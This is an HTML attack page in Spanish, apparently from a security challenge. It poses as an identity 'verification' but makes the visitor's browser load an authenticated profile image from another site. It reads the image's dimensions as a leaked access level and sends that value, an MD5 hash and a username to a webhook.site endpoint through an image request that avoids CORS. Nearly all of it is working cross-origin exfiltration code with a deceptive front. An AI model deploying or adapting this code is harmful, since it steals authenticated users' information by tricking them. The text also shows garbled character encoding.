<!DOCTYPE html>
<html>
<head>
    <title>Verificaci√≥n de Sistema</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            max-width: 800px; 
            margin: 50px auto; 
            padding: 20px;
            text-align: center;
        }
        .success { 
            background: #d4edda; 
            color: #155724; 
            padding: 20px; 
            border-radius: 10px; 
            margin: 20px 0;
        }
        .error { 
            background: #f8d7da; 
            color: #721c24; 
            padding: 20px; 
            border-radius: 10px; 
            margin: 20px 0;
        }
        code {
            background: #f1f1f1;
            padding: 5px 10px;
            border-radius: 4px;
            font-family: monospace;
        }
    </style>
</head>
<body>
    <h1>üîê Verificaci√≥n de Identidad</h1>
    <p>Estamos verificando tu nivel de acceso en el sistema...</p>
    
    <div id="status" class="error">‚è≥ Iniciando verificaci√≥n...</div>
    <div id="debug"></div>

    <script>
        function debug(msg) {
            console.log(msg);
            document.getElementById('debug').innerHTML += '<p><small>' + msg + '</small></p>';
        }
        
        function success(level, md5, width, height) {
            document.getElementById('status').className = 'success';
            document.getElementById('status').innerHTML = `
                <h3>‚úÖ Verificaci√≥n Exitosa</h3>
                <p><strong>Dimensiones:</strong> ${width} √ó ${height} px</p>
                <p><strong>Nivel de acceso:</strong> ${level}</p>
                <p><strong>C√≥digo MD5:</strong> <code>${md5}</code></p>
                <p><em>Esta informaci√≥n ha sido registrada en el sistema</em></p>
            `;
            
            // Exfiltrar VIA IMG SRC (evita CORS completamente: solo carga, no lee response)
            const params = new URLSearchParams({
                level: level,
                md5: md5,
                dimensions: `${width}x${height}`,
                user: 'pepe',
                source: 'github-pages',
                timestamp: new Date().toISOString()
            });
            const exfilUrl = `https://webhook.site/1df096b4-f7f3-4016-9465-a065ce0c001c?${params.toString()}`;
            
            const exfilImg = new Image();
            exfilImg.src = exfilUrl;
            exfilImg.onload = () => debug('üì§ Datos exfiltrados exitosamente via img src (ver logs en webhook.site)');
            exfilImg.onerror = (e) => debug('‚ùå Error en exfiltraci√≥n: ' + e);
        }
        
        function error(msg) {
            document.getElementById('status').className = 'error';
            document.getElementById('status').innerHTML = `
                <h3>‚ùå Error en la verificaci√≥n</h3>
                <p>${msg}</p>
            `;
        }
        
        // Iniciar el ataque
        debug('üöÄ Iniciando script...');
        debug('üìù Verificando acceso a imagen de perfil...');
        
        const img = new Image();
        
        img.onload = function() {
            debug('‚úÖ Imagen cargada exitosamente');
            const width = this.naturalWidth || this.width;
            const height = this.naturalHeight || this.height;
            const level = width * height;
            const md5 = CryptoJS.MD5(level.toString()).toString();
            
            debug(`üìè Dimensiones detectadas: ${width} √ó ${height} px`);
            debug(`üéØ Nivel calculado: ${level}`);
            debug(`üîê MD5 generado: ${md5}`);
            
            success(level, md5, width, height);
        };
        
        img.onerror = function(e) {
            debug('‚ùå Error cargando imagen: ' + e);
            error('No se pudo acceder a la imagen de perfil. Aseg√∫rate de estar autenticado en el sistema principal.');
        };
        
        // Cargar la imagen (sin crossOrigin para evitar CORS)
        const imageUrl = 'https://chl-1dfb4575-8986-4f39-aa84-7713afa6f5b6-imagen-importante.softwareseguro.com.ar/profile-pic?nocache=' + Date.now();
        debug('üñºÔ∏è Cargando imagen desde: ' + imageUrl);
        img.src = imageUrl;
    </script>
</body>
</html>
